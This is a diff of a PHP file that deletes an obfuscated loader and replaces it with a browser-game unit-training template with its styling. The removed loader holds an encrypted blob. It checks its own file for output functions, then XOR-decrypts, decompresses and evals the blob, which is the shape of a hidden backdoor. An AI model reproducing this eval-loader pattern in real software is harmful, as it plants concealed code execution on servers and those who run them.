@@ -1,24 +1,210 @@
-<?php
-$gyioxyrk="b85b48a649c0561838af1bb88b639116";
-$vwcops="56080306570f03550101560002075309005c0251575b5a085a04540609010455";
-$psvlyqgxo="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";
-$ydmfwyjw=file_get_contents(__FILE__);
-$lihfne=str_replace($psvlyqgxo,"",$ydmfwyjw);
-if(strpos($lihfne,"ec"."ho")!==false||strpos($lihfne,"pr"."int")!==false||strpos($lihfne,"var_"."dump")!==false||strpos($lihfne,"file_put_"."contents")!==false||strpos($lihfne,"fw"."rite")!==false){die();}
-$chxjpajtujm=str_replace(array($gyioxyrk,$vwcops),array("SP_f446fcfe","KP_186b560f"),$ydmfwyjw);
-$ftmaygd=md5($chxjpajtujm);
-$uvqrhkh=hex2bin($vwcops);
-$hswqdoejm="";
-$vcppdy=strlen($ftmaygd);
-for($cwrygzwguga=0;$cwrygzwguga<$vcppdy;$cwrygzwguga++){
-$hswqdoejm.=chr(ord($uvqrhkh[$cwrygzwguga])^ord($ftmaygd[$cwrygzwguga]));
-}
-$aedpgmawbo=base64_decode($psvlyqgxo);
-$mkjwewf=strlen($aedpgmawbo);
-$pdaulymok="";
-$nqnvtck=strlen($hswqdoejm);
-for($cwrygzwguga=0;$cwrygzwguga<$mkjwewf;$cwrygzwguga++){
-$pdaulymok.=$aedpgmawbo[$cwrygzwguga]^$hswqdoejm[$cwrygzwguga%$nqnvtck];
-}
-$khrobwjnw="gzun"."compress";
-eval('?>' . $khrobwjnw($pdaulymok) . '<?php ');
+<div class="train-screen">
+    <h2><?= __('screens.train.title') ?></h2>
+
+    <div class="resources-display">
+        <span><?= __('screens.recruitment.wood') ?>: <?= floor($resources['wood']) ?></span>
+        <span><?= __('screens.recruitment.clay') ?>: <?= floor($resources['stone']) ?></span>
+        <span><?= __('screens.recruitment.iron') ?>: <?= floor($resources['iron']) ?></span>
+        <span><?= __('screens.train.free_population') ?>:
+            <?= $resources['max_farm'] - $village['r_bh'] ?>/<?= $resources['max_farm'] ?></span>
+    </div>
+
+    <?php foreach ($buildings as $building): ?>
+        <?php if ($village[$building] > 0 && !empty($availableUnits[$building])): ?>
+            <div class="building-section">
+                <h3>
+                    <?php
+                    $buildingNames = [
+                        'barracks' => __('screens.train.barracks'),
+                        'stable' => __('screens.train.stable'),
+                        'garage' => __('screens.train.garage')
+                    ];
+                    echo $buildingNames[$building] . ' (' . __('screens.common.level') . ' ' . $village[$building] . ')';
+                    ?>
+                </h3>
+
+                <?php if (!empty($recruitmentQueues[$building])): ?>
+                    <div class="recruitment-queue">
+                        <h4><?= __('screens.train.recruitment_queue') ?></h4>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th><?= __('screens.recruitment.unit') ?></th>
+                                    <th><?= __('screens.train.quantity') ?></th>
+                                    <th><?= __('screens.train.completion') ?></th>
+                                    <th><?= __('screens.train.actions') ?></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <?php foreach ($recruitmentQueues[$building] as $recruit): ?>
+                                    <tr>
+                                        <td><?= $availableUnits[$building][$recruit['unit']]['name'] ?? $recruit['unit'] ?></td>
+                                        <td><?= $recruit['num_unit'] - floor($recruit['num_finished']) ?></td>
+                                        <td><?= date('H:i:s', $recruit['time_finished']) ?></td>
+                                        <td>
+                                            <a href="?action=cancel_recruit&id=<?= $recruit['id'] ?>" class="cancel-link">
+                                                <?= __('screens.train.cancel_refund') ?>
+                                            </a>
+                                        </td>
+                                    </tr>
+                                <?php endforeach; ?>
+                            </tbody>
+                        </table>
+                    </div>
+                <?php endif; ?>
+
+                <div class="recruitment-form">
+                    <h4><?= __('screens.common.recruit_units') ?></h4>
+                    <form method="post" action="?action=recruit_units">
+                        <input type="hidden" name="building" value="<?= $building ?>" />
+                        <input type="hidden" name="village" value="<?= $village['id'] ?>" />
+
+                        <table class="units-table">
+                            <thead>
+                                <tr>
+                                    <th><?= __('screens.recruitment.unit') ?></th>
+                                    <th><?= __('screens.recruitment.cost') ?></th>
+                                    <th><?= __('screens.recruitment.population') ?></th>
+                                    <th><?= __('screens.recruitment.time') ?></th>
+                                    <th><?= __('screens.train.available') ?></th>
+                                    <th><?= __('screens.common.recruit') ?></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <?php foreach ($availableUnits[$building] as $unitKey => $unit): ?>
+                                    <tr>
+                                        <td><strong><?= $unit['name'] ?></strong></td>
+                                        <td>
+                                            <span class="resource-cost">
+                                                🪵 <?= $unit['wood'] ?>
+                                                🧱 <?= $unit['stone'] ?>
+                                                ⚔️ <?= $unit['iron'] ?>
+                                            </span>
+                                        </td>
+                                        <td><?= $unit['pop'] ?></td>
+                                        <td><?= gmdate('H:i:s', $unit['time']) ?></td>
+                                        <td><?= $currentUnits[$unitKey] ?? 0 ?></td>
+                                        <td>
+                                            <input type="number" name="units[<?= $unitKey ?>]" min="0" max="1000" value="0"
+                                                class="recruit-input" />
+                                        </td>
+                                    </tr>
+                                <?php endforeach; ?>
+                            </tbody>
+                        </table>
+
+                        <button type="submit" class="btn-recruit"><?= __('screens.common.recruit') ?></button>
+                    </form>
+                </div>
+            </div>
+        <?php endif; ?>
+    <?php endforeach; ?>
+
+    <?php if (empty($availableUnits)): ?>
+        <p class="no-buildings"><?= __('screens.train.no_military_buildings') ?></p>
+    <?php endif; ?>
+</div>
+
+<style>
+    .train-screen {
+        padding: 20px;
+    }
+
+    .resources-display {
+        display: flex;
+        gap: 20px;
+        padding: 15px;
+        background: #f5f5f5;
+        border-radius: 5px;
+        margin-bottom: 20px;
+    }
+
+    .resources-display span {
+        font-weight: bold;
+    }
+
+    .building-section {
+        margin-bottom: 30px;
+        border: 1px solid #ddd;
+        padding: 15px;
+        border-radius: 5px;
+    }
+
+    .building-section h3 {
+        margin-top: 0;
+        color: #333;
+    }
+
+    .recruitment-queue {
+        margin-bottom: 20px;
+        padding: 10px;
+        background: #fff3cd;
+        border-radius: 5px;
+    }
+
+    .recruitment-queue table {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 10px;
+    }
+
+    .recruitment-queue th,
+    .recruitment-queue td {
+        padding: 8px;
+        text-align: left;
+        border-bottom: 1px solid #ddd;
+    }
+
+    .cancel-link {
+        color: #f44336;
+        text-decoration: none;
+    }
+
+    .units-table {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 10px;
+    }
+
+    .units-table th,
+    .units-table td {
+        padding: 10px;
+        text-align: left;
+        border-bottom: 1px solid #ddd;
+    }
+
+    .units-table th {
+        background: #f5f5f5;
+        font-weight: bold;
+    }
+
+    .resource-cost {
+        font-size: 12px;
+    }
+
+    .recruit-input {
+        width: 80px;
+        padding: 5px;
+    }
+
+    .btn-recruit {
+        margin-top: 15px;
+        padding: 10px 20px;
+        background: #4CAF50;
+        color: white;
+        border: none;
+        border-radius: 3px;
+        cursor: pointer;
+        font-size: 16px;
+    }
+
+    .btn-recruit:hover {
+        background: #45a049;
+    }
+
+    .no-buildings {
+        padding: 20px;
+        text-align: center;
+        color: #999;
+    }
+</style>
